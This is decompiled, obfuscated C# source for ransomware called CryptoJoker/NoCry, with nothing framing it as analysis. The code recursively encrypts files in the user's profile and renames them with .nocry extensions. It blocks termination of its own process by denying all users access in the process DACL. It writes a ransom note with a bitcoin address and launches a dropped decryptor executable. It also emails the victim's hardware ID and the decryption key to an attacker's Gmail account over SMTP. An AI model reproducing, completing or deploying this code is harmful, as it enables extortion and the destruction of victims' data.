using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;
using CryptoJoker;

namespace ns0;

internal class Class1
{
	[Flags]
	private enum Enum0
	{
		flag_0 = 0x80,
		flag_1 = 2,
		flag_2 = 0x40,
		flag_3 = 0x400,
		flag_4 = 0x1000,
		flag_5 = 0x200,
		flag_6 = 0x100,
		flag_7 = 0x800,
		flag_8 = 1,
		flag_9 = 8,
		flag_10 = 0x10,
		flag_11 = 0x20,
		flag_12 = 0x10000,
		flag_13 = 0x20000,
		flag_14 = 0x100000,
		flag_15 = 0x40000,
		flag_16 = 0x80000,
		flag_17 = 0xF0000,
		flag_18 = 0x1F0FFF
	}

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr intptr_0, int int_0, [Out] byte[] byte_0, uint uint_0, out uint uint_1);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr intptr_0, int int_0, [In] byte[] byte_0);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetCurrentProcess();

	private static void Main(string[] args)
	{
		if (smethod_7())
		{
			smethod_3();
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "jokingwithyou.nocry");
			if (!File.Exists(path))
			{
				smethod_0();
			}
		}
	}

	private static void smethod_0()
	{
		try
		{
			string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "jokingwithyou.nocry");
			string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
			string path2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "encKey.nocry");
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "NoCryDecrypt0r.exe");
			string string_ = string.Empty;
			string string_2 = string.Empty;
			List<string> list = smethod_2(environmentVariable, "*.*");
			Class0 @class = new Class0();
			foreach (string item in list)
			{
				FileInfo fileInfo = new FileInfo(item);
				if (fileInfo.Extension == ".txt" || fileInfo.Extension == ".md")
				{
					try
					{
						@class.method_3(fileInfo.FullName);
						File.Move(fileInfo.FullName, Path.Combine(fileInfo.DirectoryName, fileInfo.Name + ".fully.nocry"));
					}
					catch (Exception)
					{
					}
				}
				else
				{
					try
					{
						@class.method_5(fileInfo.FullName);
						File.Move(fileInfo.FullName, Path.Combine(fileInfo.DirectoryName, fileInfo.Name + ".partially.nocry"));
					}
					catch (Exception)
					{
					}
				}
			}
			@class.method_0(1024, out string_, out string_2);
			byte[] byte_ = smethod_8(@class.EncryptionKey);
			byte_ = @class.method_1(byte_, 1024, string_);
			File.WriteAllText(path2, Convert.ToBase64String(byte_));
			using (StreamWriter streamWriter = new StreamWriter(path, append: true))
			{
				streamWriter.WriteLine("Do not delete this file, else the decryption process will be broken");
			}
			string cryptoJokerMessage = Class4.CryptoJokerMessage;
			cryptoJokerMessage = cryptoJokerMessage.Replace("[HWID goes here]", smethod_6());
			cryptoJokerMessage = cryptoJokerMessage.Replace("[bitcoin address]", "1yh3eJjuXwqqXgpu8stnojm148b8d6NFQ");
			File.WriteAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "CryptoJoker Recovery Information.txt"), cryptoJokerMessage, Encoding.Unicode);
			smethod_1(string_2);
			if (!File.Exists(text))
			{
				File.WriteAllBytes(text, Class4.CryptoJoker);
			}
			Process.Start(text);
		}
		catch (Exception)
		{
		}
	}

	private static void smethod_1(string string_0)
	{
		string body = "The HWID is: " + smethod_6() + " And the decryption key is: " + Convert.ToBase64String(smethod_8(string_0));
		MailMessage mailMessage = new MailMessage();
		mailMessage.From = new MailAddress("theemailtologin@gmail.com");
		mailMessage.To.Add(new MailAddress("theemailtosendthekey@gmail.com"));
		mailMessage.Subject = "New Ransomware Victim!";
		mailMessage.Body = body;
		SmtpClient smtpClient = new SmtpClient();
		smtpClient.Host = "smtp.gmail.com";
		smtpClient.Port = 587;
		smtpClient.EnableSsl = true;
		smtpClient.UseDefaultCredentials = false;
		smtpClient.Credentials = new NetworkCredential("theemailtologin@gmail.com", "thepasswordoftheaccount");
		smtpClient.Send(mailMessage);
	}

	private static List<string> smethod_2(string string_0, string string_1)
	{
		List<string> list = new List<string>();
		try
		{
			list.AddRange(Directory.GetFiles(string_0, string_1, SearchOption.TopDirectoryOnly));
			string[] directories = Directory.GetDirectories(string_0);
			foreach (string string_2 in directories)
			{
				list.AddRange(smethod_2(string_2, string_1));
			}
		}
		catch (Exception)
		{
		}
		return list;
	}

	private static void smethod_3()
	{
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor rawSecurityDescriptor = smethod_4(currentProcess);
		rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 2035711, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		smethod_5(currentProcess, rawSecurityDescriptor);
	}

	private static RawSecurityDescriptor smethod_4(IntPtr intptr_0)
	{
		byte[] byte_ = new byte[0];
		GetKernelObjectSecurity(intptr_0, 4, byte_, 0u, out var uint_);
		if ((long)uint_ > 32767L)
		{
			throw new Win32Exception();
		}
		if (!GetKernelObjectSecurity(intptr_0, 4, byte_ = new byte[uint_], uint_, out uint_))
		{
			throw new Win32Exception();
		}
		return new RawSecurityDescriptor(byte_, 0);
	}

	private static void smethod_5(IntPtr intptr_0, RawSecurityDescriptor rawSecurityDescriptor_0)
	{
		byte[] array = new byte[rawSecurityDescriptor_0.BinaryLength];
		rawSecurityDescriptor_0.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(intptr_0, 4, array))
		{
			throw new Win32Exception();
		}
	}

	private static string smethod_6()
	{
		UHWIDEngine uHWIDEngine = new UHWIDEngine();
		return uHWIDEngine.SimpleUID;
	}

	private static bool smethod_7()
	{
		bool createdNew;
		Mutex obj = new Mutex(initiallyOwned: true, "CryptNocryWalker90912", out createdNew);
		if (!createdNew)
		{
			return false;
		}
		GC.KeepAlive(obj);
		return true;
	}

	private static byte[] smethod_8(string string_0)
	{
		byte[] array = new byte[string_0.Length * 2];
		Buffer.BlockCopy(string_0.ToCharArray(), 0, array, 0, array.Length);
		return array;
	}
}
